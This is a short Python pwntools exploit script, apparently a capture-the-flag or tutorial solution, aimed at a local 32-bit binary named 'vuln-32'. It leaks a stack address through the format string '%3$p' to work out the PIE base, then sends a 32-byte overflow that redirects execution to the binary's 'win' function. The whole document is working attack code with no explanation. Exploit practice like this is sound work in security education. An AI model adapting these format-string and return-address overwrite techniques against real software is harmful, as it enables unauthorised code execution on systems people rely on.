#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil(b'name?\n')
p.sendline(b'%3$p')

p.recvuntil(b'you ')
elf_leak = int(p.recvline(), 16)
print(hex(elf_leak))

elf.address = elf_leak - 0x11d5

log.success(f'PIE base: { hex(elf.address) }')

offset = 32

payload = flat(
    b'A' * offset,
    elf.sym['win']
)

p.recvuntil(b'message?\n')
p.sendline(payload)

print(p.clean().decode())
